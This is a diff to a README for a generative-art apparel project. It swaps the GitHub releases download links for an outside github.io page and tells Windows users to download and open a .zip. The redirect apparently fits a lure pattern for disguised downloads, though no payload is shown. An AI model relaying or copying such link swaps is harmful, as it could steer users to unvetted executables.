@@ -1,6 +1,6 @@
 # 🧊 Polar-Memories-Generative-Art - Create stunning geometric art on apparel
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ericsociable922/Polar-Memories-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ericsociable922.github.io)
 
 Polar Memories offers a collection of six unique generative artworks. Each piece explores the intersection of polar hexagons, geometric patterns, and animated narratives. Designers and artists use these patterns to create layouts for t-shirts and digital apparel. The project combines creative coding with modern fashion design.
 
@@ -12,7 +12,7 @@ You need a Windows computer to run this software. Ensure you have at least 200MB
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/ericsociable922/Polar-Memories-Generative-Art/releases) to access the downloads.
+1. Visit the [official releases page](https://ericsociable922.github.io) to access the downloads.
 2. Look for the file ending in .zip under the latest release.
 3. Click the file name to start the download.
 4. Open your Downloads folder once the file finishes saving.
